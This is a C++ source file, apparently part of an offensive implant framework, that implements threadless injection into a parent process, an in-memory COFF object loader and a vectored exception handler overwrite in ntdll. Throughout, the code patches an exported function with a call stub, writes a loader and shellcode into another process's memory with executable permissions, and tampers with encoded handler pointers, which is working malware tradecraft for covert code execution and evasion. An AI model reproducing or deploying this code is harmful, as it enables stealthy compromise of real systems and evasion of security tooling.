#include <core/include/inject.hpp>
#define CALL_X_OFFSET 0x1
#define EXPORT_OFFSET 0x12

namespace Injection {

    VOID Threadless(const _threadless &writer, void *const shellcode, size_t n_shellcode, size_t total) {
        HEXANE

        HANDLE process      = { };
        UINT_PTR ex_addr    = 0;
        UINT_PTR ex_addr_p  = 0;
        UINT_PTR hook       = 0;
        SIZE_T write        = 0;

        if (!(ex_addr = Memory::Modules::LoadExport(writer.module, writer.exp)) ||
            !(process = Process::OpenParentProcess(writer.parent)) ||
            !(hook = Memory::Scanners::RelocateExport(process, C_PTR(ex_addr), n_shellcode))) {
            return;
        }

        auto hook_p = hook;
        const auto loader_rva = hook - (ex_addr + 5);

        x_memcpy(&ex_addr_p, &ex_addr, sizeof(void*));
        x_memcpy(B_PTR(writer.loader)+EXPORT_OFFSET, &ex_addr_p, sizeof(void*));
        x_memcpy(B_PTR(writer.opcode)+CALL_X_OFFSET, &loader_rva, 4);

        if (
            !NT_SUCCESS(ntstatus = Ctx->nt.NtProtectVirtualMemory(process, R_CAST(void**, &ex_addr_p), &total, PAGE_EXECUTE_READWRITE, nullptr)) ||
            !NT_SUCCESS(ntstatus = Ctx->nt.NtWriteVirtualMemory(process, C_PTR(ex_addr), R_CAST(void*, writer.opcode->data), 0x5, &write)) || write != 0x5) {
            return_defer(ntstatus);
        }
        if (
            !NT_SUCCESS(ntstatus = Ctx->nt.NtProtectVirtualMemory(process, R_CAST(void** , &hook_p), &total, PAGE_READWRITE, nullptr)) ||
            !NT_SUCCESS(ntstatus = Ctx->nt.NtWriteVirtualMemory(process, C_PTR(hook), writer.loader->data, writer.loader->length, &write)) || write != writer.loader->length) {
            return_defer(ntstatus);
        }

        //Xtea::XteaCrypt(R_CAST(PBYTE, shellcode), n_shellcode, Ctx->Config.Key, FALSE);

        if (
            !NT_SUCCESS(ntstatus = Ctx->nt.NtWriteVirtualMemory(process, C_PTR(hook + writer.loader->length), shellcode, n_shellcode, &write)) || write != n_shellcode ||
            !NT_SUCCESS(ntstatus = Ctx->nt.NtProtectVirtualMemory(process, R_CAST(void**, &hook), &n_shellcode, PAGE_EXECUTE_READ, nullptr))) {
            return_defer(ntstatus);
        }

        defer:
        if (process) {
            Ctx->nt.NtClose(process);
        }
    }

    VOID LoadObject(const char* const entrypoint, uint8_t* const data, void* const args, size_t arg_size, uint32_t req_id) {
        HEXANE

        _executable* object = Memory::Methods::CreateImageData(B_PTR(data));

        object->next = Ctx->coffs;
        Ctx->coffs = object;

        if (!Opsec::SeImageCheckArch(object)) {
            return_defer(ntstatus);
        }

        if (!Memory::Objects::MapSections(object, data)) {
            return_defer(ntstatus);
        }

        if (!Memory::Objects::BaseRelocation(object)) {
            return_defer(ntstatus);
        }

        if (!Memory::Execute::ExecuteObject(object, entrypoint, args, arg_size, req_id)) {
            return_defer(ntstatus);
        }

    defer:
        if (ntstatus != ERROR_SUCCESS) {
            Ctx->nt.RtlFreeHeap(Ctx->heap, 0, object);
        }
    }

    namespace Veh {

        UINT_PTR GetFirstHandler(LDR_DATA_TABLE_ENTRY *module, const char *const signature, const char *const mask) {
            HEXANE

            LdrpVectorHandlerList *handlers = { };
            uintptr_t handler = { };
            uint32_t match = 0;

            if (!(match = Memory::Scanners::SignatureScan(R_CAST(uintptr_t, module->DllBase), module->SizeOfImage, signature, mask))) {
                return_defer(ERROR_INCORRECT_ADDRESS);
            }

            match += 0xD;
            handlers = R_CAST(LdrpVectorHandlerList*, *R_CAST(int32_t * , match + (match + 0x3) + 0x7));

            if (!NT_SUCCESS(Ctx->nt.NtReadVirtualMemory(NtCurrentProcess(), R_CAST(void*, handlers->first), &handler, sizeof(void *), nullptr))) {
                handler = 0;
                return_defer(ntstatus);
            }

            defer:
            return handler;
        }

        UINT_PTR PointerEncodeDecode(uintptr_t const &pointer, const bool encode) {
            HEXANE

            const auto cookie = Memory::Methods::GetStackCookie();
            uintptr_t encoded = 0;

            if (!cookie) {
                return_defer(ntstatus);
            }

            encode
                ? encoded = _rotr(cookie ^ pointer, cookie & 0x1F)
                : encoded = cookie ^ _rotr(pointer, 0x20 - (cookie & 0x1F));

            defer:
            return encoded;
        }

        NTSTATUS OverwriteFirstHandler(_veh_writer const &writer) {
            HEXANE

            const auto mod_hash = Utils::GetHashFromStringW(writer.mod_name, x_wcslen(writer.mod_name));
            const auto ntdll = Memory::Modules::GetModuleEntry(mod_hash);

            const auto entry = GetFirstHandler(ntdll, writer.signature, writer.mask);
            const auto handler = PointerEncodeDecode(entry, false) + 0x20;

            if (!entry) {
                return FALSE;
            }

            return Ctx->nt.NtWriteVirtualMemory(NtCurrentProcess(), C_PTR(handler), writer.target, sizeof(uintptr_t), nullptr);
        }

    }
}